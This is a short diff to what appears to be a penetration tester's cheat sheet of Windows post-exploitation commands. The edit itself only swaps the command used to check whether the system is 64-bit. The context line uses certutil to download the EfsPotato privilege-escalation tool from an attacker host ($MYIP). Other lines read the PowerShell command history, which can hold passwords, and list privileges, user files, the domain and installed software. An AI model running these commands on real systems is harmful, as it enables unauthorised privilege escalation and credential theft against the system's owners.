@@ -989,8 +989,8 @@ certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPo
 powershell -c "type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 powershell -c "whoami /user /priv"
 powershell -c "cd \users; tree /a /f"
-powershell -c "wmic os get osarchitecture"
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
+powershell -c "if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' }"
 
 +---------- Installed Apps ----------+
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
